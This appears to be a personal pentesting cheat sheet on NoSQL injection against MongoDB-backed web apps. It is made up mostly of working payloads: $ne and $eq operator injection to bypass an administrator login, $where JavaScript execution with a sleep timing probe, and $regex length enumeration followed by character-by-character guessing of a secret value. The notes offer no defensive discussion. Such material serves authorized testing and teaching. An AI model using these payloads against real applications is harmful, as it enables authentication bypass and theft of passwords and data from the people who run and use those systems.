# NoSQLi
SQL engines and MongoDB are different in how they store and manage data, but under the right circumstances the query's logic can be altered.
```
SELECT * FROM users WHERE username='admin' AND password='pass';
db.collection(‘users’).find({‘username’:admin, ‘password’: pass});
```
A collection in MongoDB is somewhat analogous to a table, containing documents which often share the same structure of key value pairs.
## Tricks
### $ne
we can introduce to ```GET /user?username=lowpriv``` the payload: ```username[$ne]='none'``` to get all users whose usernames are not 'none'.
we can loosely compare types using either ```$ne```, ```$gt```, ```$lt```, for example:
```
POST /login

{
  "username":{"$eq":"administrator"},
  "password":{"$ne":1}
}
```
### $where
can be used to execute arbitrary javascript.
```
{
  "$where": "function() { sleep(5000); return true; }"
}
```
### $regex
can match values with regex
#### length enumeration
```
POST /list_items

{
  "description": {
    "$regex": ".{1}"
  }
}
```
```
"$regex": ".{2}"
"$regex": ".{3}"
```
and so on.
after length has been recovered we can fuzz the value with repeated checks:
```{"$regex": "P.{7}"}```
```{"$regex": "Pa.{6}"}```
```{"$regex": "Pas.{5}"}```
